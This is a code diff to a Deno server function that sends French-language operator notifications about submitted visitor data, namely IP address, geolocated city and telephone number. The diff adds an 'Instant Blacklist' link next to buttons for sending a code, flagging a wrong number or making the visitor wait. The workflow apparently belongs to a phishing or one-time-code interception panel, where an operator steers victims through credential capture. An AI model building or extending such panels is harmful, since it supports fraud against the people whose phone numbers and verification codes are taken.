@@ -46,6 +46,10 @@ Deno.serve(async (req) => {
   const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
 
+  // Create a simple blacklist URL with base64 encoding
+  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
+  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
+
   const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
   let geoData = { country_name: "France", city: "Inconnue" };
   if (geoResponse?.ok) {
@@ -70,7 +74,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})`,
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
         inline: false
       },
     ],
